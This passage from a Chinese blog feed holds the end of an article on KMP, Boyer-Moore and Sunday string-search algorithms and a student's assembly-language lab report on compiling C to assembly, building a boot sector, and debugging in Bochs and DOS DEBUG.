spellcheck="true">//之前只有这一行</span>            <span class="token keyword">else</span>                <span class="token comment" spellcheck="true">//因为不能出现p[j] = p[(next[j])]，所以当出现时需要继续递归，k = next[k] = next[next[k]]</span>                next<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> next<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            k <span class="token operator">=</span> next<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="拓展延伸：-Sunday-算法"><a href="#拓展延伸：-Sunday-算法" class="headerlink" title="拓展延伸： Sunday 算法"></a>拓展延伸： Sunday 算法</h2><h3 id="Boyer-Moore-算法"><a href="#Boyer-Moore-算法" class="headerlink" title="Boyer-Moore 算法"></a>Boyer-Moore 算法</h3><p>略显复杂，略去不提，看文章开头有 Wikipedia 链接，也是一个改进算法。</p><p>该算法从模式串的尾部开始匹配，且拥有在最坏情况下O(N)的时间复杂度。在实践中，比KMP算法的实际效能高。</p><p>BM算法定义了两个规则：</p><p>坏字符规则：当文本串中的某个字符跟模式串的某个字符不匹配时，我们称文本串中的这个失配字符为坏字符，此时模式串需要向右移动，移动的位数 = 坏字符在模式串中的位置 - 坏字符在模式串中最右出现的位置。此外，如果”坏字符”不包含在模式串之中，则最右出现位置为-1。</p><p>好后缀规则：当字符失配时，后移位数 = 好后缀在模式串中的位置 - 好后缀在模式串上一次出现的位置，且如果好后缀在模式串中没有再次出现，则为-1。</p><h3 id="Sunday-算法"><a href="#Sunday-算法" class="headerlink" title="Sunday 算法"></a>Sunday 算法</h3><p>上文中，我们已经介绍了 <code>KMP</code> 算法和 <code>BM</code> 算法，这两个算法在最坏情况下均具有线性的查找时间。但实际上， <code>KMP</code> 算法并不比最简单的 <code>C</code> 库函数 <code>strstr()</code> 快多少，而 <code>BM</code> 算法虽然通常比 <code>KMP</code> 算法快，但 <code>BM</code> 算法也还不是现有字符串查找算法中最快的算法，本文最后再介绍一种比 <code>BM</code> 算法更快的查找算法即 <code>Sunday</code> 算法。</p><p>Sunday 算法由 Daniel M.Sunday 在 1990 年提出，它的思想跟 BM 算法很相似：</p><p>只不过 Sunday 算法是从前往后匹配，在匹配失败时关注的是文本串中参加匹配的最末位字符的下一位字符。如果该字符没有在模式串中出现则直接跳过，即移动位数 = 匹配串长度 + 1；否则，其移动位数 = 模式串中最右端的该字符到末尾的距离 + 1。</p><p>下面举个例子说明下 Sunday 算法。假定现在要在文本串 “substring searching algorithm” 中查找模式串 “search” 。</p><ol><li>刚开始时，把模式串与文本串左边对齐：</li></ol><pre><code>substring searching algorithmsearch^</code></pre><ol start="2"><li>结果发现在第 2 个字符处发现不匹配，不匹配时关注文本串中参加匹配的最末位字符的下一位字符，即标粗的字符 i，因为模式串 search 中并不存在 i，所以模式串直接跳过一大片，向右移动位数 = 匹配串长度 + 1 = 6 + 1 = 7，从 i 之后的那个字符（即字符 n ）开始下一步的匹配，如下图：</li></ol><pre><code>substring searching algorithm　　　     search　　　　 ^</code></pre><ol start="3"><li>结果第一个字符就不匹配，再看文本串中参加匹配的最末位字符的下一位字符，是 ‘r’ ，它出现在模式串中的倒数第 3 位，于是把模式串向右移动 3 位（ r 到模式串末尾的距离 + 1 = 2 + 1 = 3 ），使两个 ‘r’ 对齐，如下：</li></ol><pre><code>substring searching algorithm　　　　        search　　　　　　　   ^</code></pre><ol start="4"><li>匹配成功。</li></ol><p>回顾整个过程，我们只移动了两次模式串就找到了匹配位置，缘于 Sunday 算法每一步的移动量都比较大，效率很高。完。</p><h2 id="一点点碎碎念"><a href="#一点点碎碎念" class="headerlink" title="一点点碎碎念"></a>一点点碎碎念</h2><p>学院现在的课程设置问题非常严重，图灵机、有限状态自动机、算法优化、通信原理、量子物理各方面的课程缺乏严重，导致学生学习专业课程时出现了极大的知识断层，课外各种杂事颇多，时间非常紧张，需要学生花大量课后时间充电。</p><p>本来计算机相关行业，知识更新速度快，入门门槛高、相对复杂，基础知识要求广泛，现在却这样，大学真的很忙。每天都是高压锅生活。为了光明的未来和亲爱的钰，还是更加努力吧！</p><p>关于昨天的汇编文章：其实用什么平台并不重要，作为入门者，你需要明白的只是老师为什么让你这样做，这样做背后的计算机原理是什么。在具体实践上，如何把本来 Windows 上的东西尽量在 Linux 上完美复现或者找到替代品。这样就好了。我知道 Windows 开发的公司仍然是绝大多数，但是在 Linux 平台写代码给了很多人一种专注于代码实现本身的感觉（虽然初始状态的学习曲线非常抖），不用像 Windows 一样各种折腾环境。更何况，Arch Linux 的系统设计注重代码正确、优雅和极简主义，期待用户能够愿意去理解系统的操作，这样的系统正是我们有一点点基础的初学者所需要的。日常用 Linux 多学点底层的东西同时又提高效率又何妨？</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><p><a href="https://blog.csdn.net/ns_code/article/details/19286279" target="_blank" rel="noopener">https://blog.csdn.net/ns_code/article/details/19286279</a></p></li><li><p><a href="https://zh.m.wikipedia.org/zh-cn/%E5%85%8B%E5%8A%AA%E6%96%AF-%E8%8E%AB%E9%87%8C%E6%96%AF-%E6%99%AE%E6%8B%89%E7%89%B9%E7%AE%97%E6%B3%95" target="_blank" rel="noopener">https://zh.m.wikipedia.org/zh-cn/%E5%85%8B%E5%8A%AA%E6%96%AF-%E8%8E%AB%E9%87%8C%E6%96%AF-%E6%99%AE%E6%8B%89%E7%89%B9%E7%AE%97%E6%B3%95</a></p></li><li><p><a href="http://saturnman.blog.163.com/blog/static/5576112010969957130/" target="_blank" rel="noopener">http://saturnman.blog.163.com/blog/static/5576112010969957130/</a></p></li><li><p><a href="https://blog.csdn.net/v_july_v/article/details/7041827" target="_blank" rel="noopener">https://blog.csdn.net/v_july_v/article/details/7041827</a>    Strongly Recommended</p></li></ul>]]></content>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>YNU - 汇编语言程序设计实验报告</title>
      <link href="/2018/ASM-exp-report/"/>
      <url>/2018/ASM-exp-report/</url>
      <content type="html"><![CDATA[<h1 id="Unrelated"><a href="#Unrelated" class="headerlink" title="Unrelated"></a>Unrelated</h1><h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>由于过去不努力和各种原因，导致没有选到汇编课程。旁听课程，保存下了逍爷的 PPT，积极参与实验和旁听课程。</p><p>这就是我现在能做的，感谢王逍老师的辛勤付出。感谢我亲爱的钰帮我做的一切，么么哒！</p><p>也感谢 RainbowTrash23333 一直以来对我的帮助，没有他们，就没有现在的我。</p><p>最后感谢 #rich 的刘老板提供的已备案域名用于本站所有图片和其他资源文件的 OSS 存储与 CDN 加速。</p><p>感谢 Github Pages 提供的 Hosting 服务。</p><p>废话不多说，上实验报告。这里由于并不提交正式的实验报告，就只是简单记录下实验步骤和踩的坑了，</p><p>用于抄袭后交作业者请自觉绕道，发现必将严惩。</p><h2 id="License"><a href="#License" class="headerlink" title="License"></a>License</h2><p>本篇文章授权 采用 CC BY-NC-ND 3.0 Unported 协议，禁止转载。</p><h2 id="Experiment-Environment"><a href="#Experiment-Environment" class="headerlink" title="Experiment Environment"></a>Experiment Environment</h2><p>Windows? 不可能的，不到 Linux 下完全没有替代工具或者我完全没时间折腾的时候我是打死都不会用的。</p><blockquote><p>Linus Torvalds: Your PC is like air-conditioning — it becomes useless when you open Windows.</p></blockquote><p>So: 实验虚拟机全部采用 KVM 搭建，目前有 MSDOS 7.11 和 Windows XP SP3.</p><pre><code>                   -`                    kmahyyg@PatrickY                   .o+`                   ----------------                  `ooo/                   OS: Arch Linux x86_64                 `+oooo:                  Host: Lenovo XiaoXin CHAO 7000                `+oooooo:                 Kernel: 4.18.14-arch1-1-ARCH                -+oooooo+:                Uptime: 1 hour, 25 mins              `/:-:++oooo+:               Packages: 1626 (pacman)             `/++++/+++++++:              Shell: zsh 5.6.2            `/++++++++++++++:             Resolution: 1920x1080, 1920x1080           `/+++ooooooooooooo/`           DE: KDE          ./ooosssso++osssssso+`          WM: KWin         .oossssso-````/ossssss+`         WM Theme: Arc-OSX-Dark-Transparent        -osssssso.      :ssssssso.        Theme: Breeze [KDE], deepin [GTK2/3]       :osssssss/        osssso+++.       Icons: Macos-sierra-CT-0.8.1 [KDE], appmenu-gtk-module [GTK2], deepin [GTK3]      /ossssssss/        +ssssooo/-       Terminal: konsole    `/ossssso+/:-        -:/+osssso+-     Terminal Font: Hack [simp] 11   `+sso+:-`                 `.-/+oso:    CPU: Intel i5-7200U (4) @ 3.100GHz  `++:.                           `-/+/   GPU: NVIDIA GeForce 940MX  .`                                 `/   GPU: Intel HD Graphics 620                                          Memory: 2296MiB / 7905MiB </code></pre><h1 id="Experiment-1"><a href="#Experiment-1" class="headerlink" title="Experiment 1"></a>Experiment 1</h1><h2 id="实验用到的软件环境"><a href="#实验用到的软件环境" class="headerlink" title="实验用到的软件环境"></a>实验用到的软件环境</h2><p>gcc (GCC) 8.2.1 20180831</p><p>Kate - Advanced Text Editor Version 18.08.2</p><h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p>C 语言编写： </p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> x<span class="token operator">=</span>学号后三位<span class="token punctuation">;</span><span class="token keyword">int</span> y<span class="token operator">=</span>学号后去掉最后一位的后四位<span class="token punctuation">;</span><span class="token keyword">int</span> z<span class="token operator">=</span>x<span class="token operator">+</span>y<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d %d %d"</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后编译生成 ASM 文件，查看并尝试解释 ASM 与 C 源代码的关系。</p><h2 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h2><p>C语言:</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> x<span class="token operator">=</span><span class="token number">152</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 数据已经经过变换处理以保护隐私</span>        <span class="token keyword">int</span> y<span class="token operator">=</span><span class="token number">2011</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> z<span class="token operator">=</span>x<span class="token operator">+</span>y<span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d %d %d"</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译： <code>gcc -O -fverbose-asm -S -fno-pic -fno-plt -fno-pie -nodefaultlibs -std=c99 exp1.c -o exp1.noplt.s</code></p><p>得到的 ASM 文件：</p><pre class="line-numbers language-asm6502"><code class="language-asm6502">        .file   "exp1.c"# GNU C99 (GCC) version 8.2.1 20180831 (x86_64-pc-linux-gnu)#       compiled by GNU C version 8.2.1 20180831, GMP version 6.1.2, MPFR version 4.0.1, MPC version 1.1.0, isl version isl-0.19-GMP# Here is the default compiler options which was builtin while compiler compile itself. Just delete them to reduce the text size.        .text        .section        .rodata.str1.1,"aMS",@progbits,1.LC0:        .string "%d %d %d"        .text        .globl  main        .type   main, @functionmain:.LFB3:        .cfi_startproc        subq    $8, %rsp        #,               ; 修改堆栈基址寄存器，进入过程。        .cfi_def_cfa_offset 16# exp1.c:7:     printf("%d %d %d",x,y,z);        movl    $2163, %ecx     #,               ; 根据显示顺序，编译器预先完成加法计算后写入 ASM， 并将数据写入到对应寄存器        movl    $2014, %edx     #,               ; 传递立即数到指定寄存器        movl    $149, %esi      #,        movl    $.LC0, %edi     #,               ; Read-Only Text data to be passed to the function        movl    $0, %eax        #,               ; Pass the beginning address to the EAX register        call    *printf@GOTPCREL(%rip)  #        ; 调用系统标准C语言库中预定义好的 printf 宏实现打印到屏幕，具体请参考 GLIBC 的 stdio 实现# exp1.c:9: }        movl    $0, %eax        #,               ; 0 传入 EAX，保存程序执行得到的返回值        addq    $8, %rsp        #,               ; 自加8 传入 栈基址寄存器 RSP，设置堆栈指针。主要用于实现堆栈平衡，即 程序执行前后 ESP 不变。        .cfi_def_cfa_offset 8        ret                                      ; 使用栈中的数据修改 IP，实现近转移，最终返回父进程。        .cfi_endproc.LFE3:        .size   main, .-main        .ident  "GCC: (GNU) 8.2.1 20180831"        .section        .note.GNU-stack,"",@progbits<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="实验分析"><a href="#实验分析" class="headerlink" title="实验分析"></a>实验分析</h2><p>请参见上方的 ASM 中 <code>;</code> 开头的代码注释。</p><h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>体验 C 到 ASM 的转化，为之后的反编译和逆向打下基础。</p><h1 id="Experiment-2"><a href="#Experiment-2" class="headerlink" title="Experiment 2"></a>Experiment 2</h1><h2 id="实验用到的软件环境-1"><a href="#实验用到的软件环境-1" class="headerlink" title="实验用到的软件环境"></a>实验用到的软件环境</h2><p>gcc (GCC) 8.2.1 20180831</p><p>Bochs x86 Emulator 2.6.9</p><p>bximage 和 dd 工具</p><p>Kate - Advanced Text Editor Version 18.08.2</p><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>练习使用 Bochs 的调试功能，为接下来的调试操作系统或者底层代码做准备。</p><h2 id="实验要求-1"><a href="#实验要求-1" class="headerlink" title="实验要求"></a>实验要求</h2><p>使用 NASM 编译给出的源代码，在计算机启动时打印你的学号。使用 BochsDBG 进行调试。</p><h2 id="实验源代码"><a href="#实验源代码" class="headerlink" title="实验源代码"></a>实验源代码</h2><pre class="line-numbers language-asm6502"><code class="language-asm6502">MOV AX,0xb810            ; move to the screen bufferMOV DS,AX                ; move the base addr to the bufferMOV BYTE[0x00], '2'      ; put the data into the bufferMOV BYTE[0x02], 'A'MOV BYTE[0x04], 'B'MOV BYTE[0x06], 'C'MOV BYTE[0x08], '1'MOV BYTE[0x0A], 'W'      ; student id data hidden for privacy protectionMOV BYTE[0x0C], 'O'MOV BYTE[0x0E], 'R'MOV BYTE[0x10], '1'MOV BYTE[0x12], 'L'MOV BYTE[0x14], 'D'JMP $                    ; loop the above code and done for fatal errorTIMES 510 - ($-$$) DB 0  ; pad remainder of boot sectors with 0DB 0x55,0xAA             ; the standard PC boot signature<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译： <code>nasm ./exp2.asm -fbin -owx -lwx.lst</code></p><p>产生的 wx 文件：<code>DOS/MBR boot sector</code></p><h2 id="实验操作：编译完成后的-BOCHS-导入"><a href="#实验操作：编译完成后的-BOCHS-导入" class="headerlink" title="实验操作：编译完成后的 BOCHS 导入"></a>实验操作：编译完成后的 BOCHS 导入</h2><p><strong>请先查阅 Bochs 手册和对应工具的 manpage 以熟悉基础操作。</strong></p><h3 id="1-写-Bochs-RC-虚拟机启动配置文件"><a href="#1-写-Bochs-RC-虚拟机启动配置文件" class="headerlink" title="1. 写 Bochs RC 虚拟机启动配置文件"></a>1. 写 Bochs RC 虚拟机启动配置文件</h3><p>范例文件请参考： <code>/etc/bochsrc-sample.txt</code></p><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">floppy_bootsig_check</span><span class="token punctuation">:</span> disabled=1<span class="token key atrule">boot</span><span class="token punctuation">:</span> floppy<span class="token punctuation">,</span> disk<span class="token punctuation">,</span> cdrom<span class="token key atrule">floppya</span><span class="token punctuation">:</span> image="boot.img"<span class="token punctuation">,</span> status=inserted<span class="token key atrule">ata0-master</span><span class="token punctuation">:</span> type=disk<span class="token punctuation">,</span> mode=flat<span class="token punctuation">,</span> path="boot.img"<span class="token punctuation">,</span> cylinders=0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>最后两行二选一，建立 1.44M 镜像。</p><h3 id="2-建立虚拟机磁盘镜像并写入对应的-Boot-Sector"><a href="#2-建立虚拟机磁盘镜像并写入对应的-Boot-Sector" class="headerlink" title="2. 建立虚拟机磁盘镜像并写入对应的 Boot Sector"></a>2. 建立虚拟机磁盘镜像并写入对应的 Boot Sector</h3><p>目的：建立 BOCHS 允许体积的镜像用于虚拟机启动，修改 0 扇区以实现 MBR 启动。</p><ul><li>bximage 创建镜像</li></ul><p>type: fd, size: 1.44, name: boot.img, Done.</p><p>请根据 <code>bximage</code> 的输出修改你的 Bochs RC 文件。</p><ul><li>dd 写入镜像</li></ul><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">dd</span> if<span class="token operator">=</span>wx.bin of<span class="token operator">=</span>boot.img bs<span class="token operator">=</span>512 count<span class="token operator">=</span>1 conv<span class="token operator">=</span>notrunc oflag<span class="token operator">=</span>direct<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-启动虚拟机"><a href="#3-启动虚拟机" class="headerlink" title="3. 启动虚拟机"></a>3. 启动虚拟机</h3><pre class="line-numbers language-bash"><code class="language-bash">$ bochs -q -f new.bochsrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="备用：挂载修改镜像"><a href="#备用：挂载修改镜像" class="headerlink" title="备用：挂载修改镜像"></a>备用：挂载修改镜像</h3><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">mount</span> ./floppya.img /mnt/floppy/ -o loop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="实验结果与分析总结"><a href="#实验结果与分析总结" class="headerlink" title="实验结果与分析总结"></a>实验结果与分析总结</h2><p>源代码相关总结请参见前文。</p><h3 id="Part-1-启动成功"><a href="#Part-1-启动成功" class="headerlink" title="Part 1: 启动成功"></a>Part 1: 启动成功</h3><p><img src="https://yygc.zzjnyyz.cn/asset_files/2018-asmexp1.png" alt="STARTUP EXP02"></p><p>踩了很多坑，主要是镜像建立和不截断写入数据。</p><h3 id="Part-2-关于-Bochs-的使用"><a href="#Part-2-关于-Bochs-的使用" class="headerlink" title="Part 2: 关于 Bochs 的使用"></a>Part 2: 关于 Bochs 的使用</h3><p>BIOS 执行完成后，会跳转到 0x7c00 位置，我们使用 <code>b 0x7c00</code> 在这里下断。</p><blockquote><p>BOCHS 简易指南<br>命令 c  运行程序，相当于windbg的g以及OD的F9<br>命令 s  即step，单步执行程序<br>命令 p  单步执行，步过函数<br>命令 q  退出bochs并关闭虚拟机<br>命令 b  下断点命令，如本例中：b 0x7c00<br>命令 blist  显示断点状态<br>命令 watch  显示当前所有读写断点<br>命令 r  显示寄存器的值<br>命令 u  反汇编代码，可设定起始和结束位置<br>命令 info 根据参数不同显示相关信息</p></blockquote><p>接下来交替使用 s 和 p 交替执行，直到 BIOS 加载完成。因为现有知识不足以看清楚 BIOS 加载和启动过程，我们直接使用 c 执行 BIOS 程序直到断点。</p><p><img src="https://yygc.zzjnyyz.cn/asset_files/2018-asmexp2.png" alt="BOCHSDBG EXP02"></p><p>到达断点处，可以看到我们编写的汇编程序源代码。最终会陷入死循环（看起来就是没动静），这时候，如果 Bochs 调试器不处于等待输入状态，则使用 Ctrl-C 跳回解释器，接下来使用 q 命令退出。</p><p>简单调试完成。对应截图中可能涉及隐私泄露的信息已经打码，很抱歉给各位带来的糟糕的体验。 </p><h1 id="Experiment-3"><a href="#Experiment-3" class="headerlink" title="Experiment 3"></a>Experiment 3</h1><h2 id="实验用到的软件环境-2"><a href="#实验用到的软件环境-2" class="headerlink" title="实验用到的软件环境"></a>实验用到的软件环境</h2><p>请参见我 <a href="https://asm.kmahyyg.xyz" target="_blank" rel="noopener">假期的汇编笔记</a></p><h2 id="实验要求-2"><a href="#实验要求-2" class="headerlink" title="实验要求"></a>实验要求</h2><p>在 MSDOS DEBUG 环境中运行汇编语句。</p><h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><h3 id="语句准备"><a href="#语句准备" class="headerlink" title="语句准备"></a>语句准备</h3><p>请参考 <a href="https://asminst.kmahyyg.xyz" target="_blank" rel="noopener">Intel Pentium Instruction Set Reference</a></p><h3 id="操作准备"><a href="#操作准备" class="headerlink" title="操作准备"></a>操作准备</h3><p>请参考 <a href="https://asm.kmahyyg.xyz/exps/exp1-dosdbg.html" target="_blank" rel="noopener">DEBUG 实验记录</a></p><p>请参考 <a href="https://asm.kmahyyg.xyz/exps/exp1-debugref.html" target="_blank" rel="noopener">DEBUG 操作参考文档</a></p><p>请参考<a href="https://thestarman.pcministry.com/asm/debug/8086REGs.htm" target="_blank" rel="noopener">8086 CPU 寄存器在 Debug 中的查看</a> : <code>NV UP EI PL NZ NA PO NC</code></p><h2 id="实验操作"><a href="#实验操作" class="headerlink" title="实验操作"></a>实验操作</h2><h3 id="通用代码模板"><a href="#通用代码模板" class="headerlink" title="通用代码模板"></a>通用代码模板</h3><pre class="line-numbers language-asm6502"><code class="language-asm6502">assume cs:codesgcodesg segment    <CODE HERE>codesg endsend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>请不要把所有实验用到的代码写在同一个文件里统一编译执行，具体原因是前面的溢出置 OF=1 会导致后面的本不应该显示 OF = 1 的语句显示出错误结果。</strong></p><h3 id="验证类"><a href="#验证类" class="headerlink" title="验证类"></a>验证类</h3><p>以下均使用 OP 替代操作码，请根据实验要求自行替换。</p><ol><li>寄存器查看并分析</li></ol><pre class="line-numbers language-asm6502"><code class="language-asm6502">MOV AX,0A95BOP AX,8CA2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><table><thead><tr><th>OP</th><th>AX</th><th>OF</th><th>SF</th><th>ZF</th><th>AF</th><th>PF</th><th>CF</th></tr></thead><tbody><tr><td>ADD</td><td>35FD</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr><tr><td>SUB</td><td>1CB9</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr></tbody></table><ol start="2"><li>寄存器查看并分析</li></ol><pre class="line-numbers language-asm6502"><code class="language-asm6502">MOV AX,96MOV BX,12OP BL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>OP</th><th>AX</th><th>OF</th><th>SF</th><th>ZF</th><th>AF</th><th>PF</th><th>CF</th></tr></thead><tbody><tr><td>MUL</td><td>0480</td><td>1</td><td>1</td><td>0</td><td>0</td><td>0</td><td>1</td></tr><tr><td>IMUL</td><td>0480</td><td>1</td><td>1</td><td>0</td><td>0</td><td>0</td><td>1</td></tr><tr><td>DIV</td><td>0008</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr><tr><td>IDIV</td><td>0008</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr></tbody></table><ol start="3"><li>寄存器查看并分析</li></ol><pre class="line-numbers language-asm6502"><code class="language-asm6502">MOV DX,0B9MOV CL,3OP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>OP</th><th>AX</th><th>OF</th><th>SF</th><th>ZF</th><th>AF</th><th>PF</th><th>CF</th></tr></thead><tbody><tr><td>STC</td><td>0000</td><td></td><td></td><td></td><td></td><td></td><td>1</td></tr><tr><td>SHR DX,1</td><td>0000</td><td></td><td></td><td></td><td></td><td>1</td><td>1</td></tr><tr><td>SAR DX,CL</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>SHL DX,CL</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>ROR DX,CL</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>ROL DL,CL</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>RCL DX,CL</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>RCR DL,1</td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><ol start="4"><li>请选择能够转移到 L1 单元的条件转移指令下打勾并分析。</li></ol><pre class="line-numbers language-asm6502"><code class="language-asm6502">MOV AX,?MOV BX,?CMP AX,BXOP L1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>AX</th><th>BX</th><th>JB</th><th>JNB</th><th>JBE</th><th>JA</th><th>JL</th><th>JNL</th><th>JLE</th><th>JG</th></tr></thead><tbody><tr><td>1F52H</td><td>1F52H</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>0FF82H</td><td>007EH</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>58BAH</td><td>020EH</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>09A0H</td><td>1E97H</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>FF5CH</td><td>FF8BH</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>8AEAH</td><td>FC29H</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h3 id="编程类"><a href="#编程类" class="headerlink" title="编程类"></a>编程类</h3><ol><li>将下列数组中的第六个数据放在 BL 寄存器中。</li></ol><pre class="line-numbers language-asm6502"><code class="language-asm6502">winder DW 1234H, 5678H, 'AB', 'CD'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>寄存器间接寻址方式： <code>NOP</code></p><p>寄存器相对寻址方式： <code>NOP</code></p><p>基址与变址寻址： <code>NOP</code></p><ol start="2"><li>按要求编写指令</li></ol><p>AX 高三位为 0： <code>NOP</code></p><p>BX 高三位为 1： <code>NOP</code></p><p>CX 高三位取反： <code>NOP</code></p><p>测试 DX 的 D3  位： <code>NOP</code></p><p>AX 与 BX 中不同的位均为 1： <code>NOP</code></p><h2 id="实验结果与分析总结-1"><a href="#实验结果与分析总结-1" class="headerlink" title="实验结果与分析总结"></a>实验结果与分析总结</h2><p>TODO</p><h1 id="临时分割线"><a href="#临时分割线" class="headerlink" title="临时分割线"></a>临时分割线</h1><p>（暂时完结）</p><p>Updated on Wed Oct 31 20:27:09 CST 2018</p><p>Rev.3</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://stackoverflow.com/questions/35762970/jmp-in-nasm-bootloader" target="_blank" rel="noopener">https://stackoverflow.com/questions/35762970/jmp-in-nasm-bootloader</a></p><p><a href="https://stackoverflow.com/questions/137038/how-do-you-get-assembler-output-from-c-c-source-in-gcc" target="_blank" rel="noopener">https://stackoverflow.com/questions/137038/how-do-you-get-assembler-output-from-c-c-source-in-gcc</a></p><p><a href="https://stackoverflow.com/questions/38335212/calling-printf-in-x86-64-using-gnu-assembler" target="_blank" rel="noopener">https://stackoverflow.com/questions/38335212/calling-printf-in-x86-64-using-gnu-assembler</a></p><p><a href="https://stackoverflow.com/questions/37902940/disable-got-in-gcc" target="_blank" rel="noopener">https://stackoverflow.com/questions/37902940/disable-got-in-gcc</a></p><p><a href="https://stackoverflow.com/questions/35762970/jmp-in-nasm-bootloader" target="_blank" rel="noopener">https://stackoverflow.com/questions/35762970/jmp-in-nasm-bootloader</a></p><p><a href="https://www.nasm.us/doc/nasmdo12.html" target="_blank" rel="noopener">https://www.nasm.us/doc/nasmdo12.html</a></p><p><a href="https://www.cnblogs.com/chengxuyuancc/archive/2013/05/13/3076524.html" target="_blank" rel="noopener">https://www.cnblogs.com/chengxuyuancc/archive/2013/05/13/3076524.html</a></p>]]></content>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> School </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Baidu OCR Restful API 的几个大坑</title>
      <link href="/2018/Baidu-OCRAPI/"/>
      <url>/2018/Baidu-OCRAPI/</url>
